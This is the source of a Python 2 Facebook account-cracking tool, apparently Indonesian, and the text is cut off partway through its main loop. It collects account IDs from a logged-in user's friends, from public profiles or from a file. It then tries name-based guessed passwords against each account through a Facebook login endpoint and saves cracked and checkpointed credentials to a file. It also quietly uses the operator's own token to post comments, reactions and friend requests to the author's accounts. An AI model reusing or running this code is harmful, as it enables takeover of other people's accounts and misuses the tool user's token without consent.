#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 crack.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print ("[!] Exit")
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		

#########LOGO#########
logo = """
░█████╗░██████╗░░░██╗██╗░█████╗░██╗░░██╗
██╔══██╗██╔══██╗░██╔╝██║██╔══██╗██║░██╔╝
██║░░╚═╝██████╔╝██╔╝░██║██║░░╚═╝█████═╝░
██║░░██╗██╔══██╗███████║██║░░██╗██╔═██╗░
╚█████╔╝██║░░██║╚════██║╚█████╔╝██║░╚██╗
░╚════╝░╚═╝░░╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[1;41;97mAuthor : WANS X GANS\033[0m 
  ▄︻̷̿┻̿═━一  ▄︻̷̿┻̿═━一  ▄︻̷̿┻̿═━一 
  ▄︻̷̿┻̿═━一  ▄︻̷̿┻̿═━一  ▄︻̷̿┻̿═━一 
══════════════════════════════════  \033[1;91m
\033[1;92mSEBELUM LU NGEHEK NGOPI DULU CUKK!!     \033[1;91m
\033[1;92m ══════════════════════════════════ \033[1;91m
\033[1;96mAuthor   : WANS X GANS
\033[1;96mTEAM : SLAYER CYBER TEAM
\033[1;96mWHATSAPP : 083139833244
\033[1;96mFACEBOOK : WANS X GANS
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Lagi Login\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\33[1;33m╔══════════════════════════════════════════╗"
	print "\33[1;33m║[\033[1;31;1m01\33[1;33m]\033[37;1mLogin Menggunakan Email / ID Facebook \33[1;33m║"
	print "\33[1;33m║[\033[1;31;1m02\33[1;33m]\033[37;1mLogin Menggunakan Token Facebook      \33[1;33m║"
	print "\33[1;33m║[\033[1;31;1m03\33[1;33m]\033[37;1mAmbil Token                           \33[1;33m║"
	print "\33[1;33m║[\033[1;31;1m00\33[1;33m]\033[37;1mKeluar                                \33[1;33m║"
	print "\33[1;33m╚══════════════════════════════════════════╝"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;93mBY Wans X Gans \033[91m:\033[1;96m ")
	if msuk =="":
		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		login()
	elif msuk =="2" or msuk =="02":
		tokenz()
	elif msuk =="3"or msuk =="03":
		Ambil_Token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar IDIOT!"
		pilih_masuk()
			
#####LOGIN_EMAIL#####
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print"\033[1;97m[\033[1;96m🤡\033[1;97m] LOGIN AKUN FACEBOOK ANDA \033[1;97m[\033[1;96m🤡\033[1;97m]"
		id = raw_input('[\033[1;95m+\033[1;97m] ID / Email =\033[1;92m ')
		pwd = raw_input('\033[1;97m[\033[1;95m?\033[1;97m] Password =\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n[!] Tidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
				os.system('xdg-open https://m.facebook.com/user.keramat.90')
				bot_komen()
			except requests.exceptions.ConnectionError:
				print"\n[!] Tidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m Sepertinya Akun Anda Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Password / Email Salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[\033[1;95m?\033[1;97m] \033[1;93mToken : \033[1;96m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
		os.system('xdg-open https://www.facebook.com/wans.xgans.94 ')
		bot_komen()
	except KeyError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Salah !"
		time.sleep(1)
		masuk()

######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100064492221960')
	kom = ('GUE PAKE SCRIPT LU WansThampans 😘😘😘')
	reac = ('ANGRY')
	post = ('138444848315255')
	post2 = ('149237547235985')
	kom2 = ('KREN WANS SEHAT SELALU YA 😘😘😘')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

######AMBIL_TOKEN######
def Ambil_Token():
	os.system("clear")
	print logo
	jalan("\033[1;92mInstall...")
	os.system ("cd ... && npm install")
	jalan ("\033[1;96mMulai...")
	os.system ("cd ... && npm start")
	raw_input("\n[ Kembali ]")
	masuk()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;31;1m=========================================="
	print "\033[37;1m=========================================="
	print "\033[1;97m[\033[1;34m✓\033[1;97m]\033[1;34m Nama Akun\033[1;91m     =>\033[1;93m "+nama
	print "\033[1;97m[\033[1;34m•\033[1;97m]\033[1;34m UID\033[1;91m           =>\033[1;93m "+id
	print "\033[1;97m[\033[1;34m+\033[1;97m]\033[1;34m Tanggal Lahir\033[1;91m =>\033[1;93m "+ a['birthday']
	print "\033[37;96m╔═════════════════════════╗"
	print "\033[37;96m║[\033[1;31;1m01\033[37;96m]\033[1;31;1m->\033[37;1mCrack ID Indonesia \033[37;96m║"
	print "\033[37;96m║[\033[1;31;1m02\033[37;96m]\033[1;31;1m->\033[37;1mKeluar             \033[37;96m║"
	print "\033[37;96m╚═════════════════════════╝"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;93mBY RikoMrko \033[91m:\033[1;96m ")
	if unikers =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[37;96m╔══════════════════════════════╗"
	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari Daftar Teman \033[37;96m║"
	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack Dari ID Publik    \033[37;96m║"
	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack Dari File         \033[37;96m║"
	print "\033[37;96m║\033[1;34m[00]\033[1;31;1m->\033[37;1mKembali                 \033[37;96m║"
	print "\033[37;96m╚══════════════════════════════╝"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;93mBY WansGansXpL\033[91m:\033[1;96m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print "\033[1;31;1m=========================================="
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print "\033[1;31;1m=========================================="
		print "\033[37;1m=========================================="
	        idt = raw_input("\033[1;97m{\033[1;34m✔\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;93m✴\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;93m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n[ Kembali ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print "\033[1;31;1m=========================================="
			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[!] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m{\033[1;93m➹\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;93m➹\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;93m➹\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)

	print "\n\033[1;31;1m=========================================="
        print "\n\033[1;96mJANGAN MENYALAH GUNAKAN SCRIPT INI YA BOSS"
        print "\n\033[1;33mBY WANS X GANS"
	print "\n\033[37;1m=========================================="
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
				z = json.loads(x.text)
				print '\x1c\33[1;33m[✔] \x1c\33[1;33mBerhasil'
				print '\x1c\33[1;33m[✴] \x1c\33[1;33mName \x1c\33[1;33m    : \x1c\33[1;33m' + c['name']
				print '\x1c\33[1;33m[➹] \x1c\33[1;33mID \x1c\33[1;33m      : \x1c\33[1;33m' + user
				print '\x1c\33[1;33m[➹] \x1c\33[1;33mPassword \x1c\33[1;33m: \x1c\33[1;33m' + pass1 + '\n'
				print '\x1c\33[1;33m[➹] \x1c\33[1;33mTanggal Lahir \x1c\33[1;33m: \x1c\33[1;33m' + c['birthday']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
					print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass1 + '\n'
					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
					cek = open("out/super_cp.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
						z = json.loads(x.text)
						print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
						print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
						print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
						print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass2 + '\n'
						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
							print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass2 + '\n'
							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
							cek = open("out/super_cp.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
								z = json.loads(x.text)
								print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
								print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
								print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
								print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass3 + '\n'
								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
									print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass3 + '\n'
									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
									cek = open("out/super_cp.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = c['last_name']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
										z = json.loads(x.text)
										print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
										print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
										print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
											print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
											print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
											print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
											print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
											cek = open("out/super_cp.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = c['last_name']+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
												z = json.loads(x.text)
												print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
												print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
												print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
												print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
												print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
													print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
													print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
													print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
													print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
													cek = open("out/super_cp.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = c['last_name']+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
														z = json.loads(x.text)
														print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
														print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
														print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
														print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
														print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
															print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
															print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
															print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
															print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
															cek = open("out/super_cp.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Sayang'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																z = json.loads(x.text)
																print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'
																print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																	print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																	print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																	print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'
																	print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																	cek = open("out/super_cp.txt", "a")
																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'Sayang123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																		z = json.loads(x.text)
																		print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																		print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
																		print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																			print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																			print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																			print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
																			print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																			cek = open("out/super_cp.txt", "a")
																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																				pass9 = 'Sayang1234'
																				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																				w = json.load(data)
																				if 'access_token' in w:
																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																					z = json.loads(x.text)
																					print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																					print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'
																					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																					oks.append(user+pass9)
																				else:
																					if 'www.facebook.com' in w['error_msg']:
																						print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
